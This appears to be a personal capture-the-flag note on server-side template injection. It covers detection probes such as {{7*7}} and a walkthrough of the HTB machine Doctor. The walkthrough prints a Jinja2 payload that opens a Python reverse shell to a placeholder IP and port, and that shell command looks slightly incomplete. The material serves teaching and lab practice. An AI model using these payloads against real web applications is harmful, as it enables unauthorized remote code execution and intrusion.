---
description: '{{7*7}}'
---

# Server-Side Template Injection

Server-Side Template Injection (SSTI) exploits Template Engines, like node.js, Flask, Twig used in web applications. These engines are used by web apps to present dynamic data via web pages and emails. However, template injection occurs when the user input is embedded in a template in an unsafe manner.

## SSTI Testing

Template injection works because websites fail to take in the data as just text, but rather process it and directly use it as part of a template, thus allowing attackers to inject template directives to manipulate the template engine used. This often leads to RCE.

To test for this, follow this flowchart from Hacktricks:

<figure><img src="../../.gitbook/assets/image (2580).png" alt=""><figcaption></figcaption></figure>

Generally, I try to identify what backend the website runs on (PHP, Ruby, etc.) and see if there are portions where **user-input is displayed** to run my tests on. This includes usernames, posts made to forums, etc.

## Example

The HTB machine Doctor uses SSTI for the initial access step.

The machine has a secret page that allows for posts by the user to be made with a **title** and **content.** We do not know the template engine being used yet.

<figure><img src="../../.gitbook/assets/image (1798).png" alt=""><figcaption></figcaption></figure>

I tested for SSTI. I tested a few payloads and made a new post:

<figure><img src="../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

The 49 present indicates that it worked, and that the other payload was not processed. Further testing with `{{7*'7'}}`would shows this:

<figure><img src="../../.gitbook/assets/image (3164).png" alt=""><figcaption></figcaption></figure>

From here, based on the flowchart, the website is running on either Jinja2 or Twig. A payload from PayloadAllTheThings can then be used:

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);").read().zfill(417)}}{%endif%}{% endfor %}


```

Editing the payload with the correct IP and port number gave me a reverse shell. SSTI is rather easy to exploit once found. Here are some other payloads used for testing:

```
${}
${7/0}
{{}}
{{7*7}}
<%= %>
<%= 7*7 %>
``
```

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" %}
